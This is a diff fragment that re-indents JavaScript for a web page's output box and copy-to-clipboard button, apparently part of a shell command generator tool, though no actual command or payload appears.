-        out.value = payload;
+      out.value = payload;
     }
-    
+
     function copyShell() {
-        var copyText = document.getElementById("rs-output");
-        copyText.select();
-        document.execCommand("copy");
-        // Visual feedback
-        var btn = event.target;
-        var ori = btn.innerText;
-        btn.innerText = "Copied!";
-        setTimeout(() => btn.innerText = ori, 1500);
+      var copyText = document.getElementById("rs-output");
+      copyText.select();
+      document.execCommand("copy");
+      // Visual feedback
+      var btn = event.target;
+      var ori = btn.innerText;
+      btn.innerText = "Copied!";
+      setTimeout(() => btn.innerText = ori, 1500);
     }
 
     // --- NEW SCRIPT: Search Feature --- //
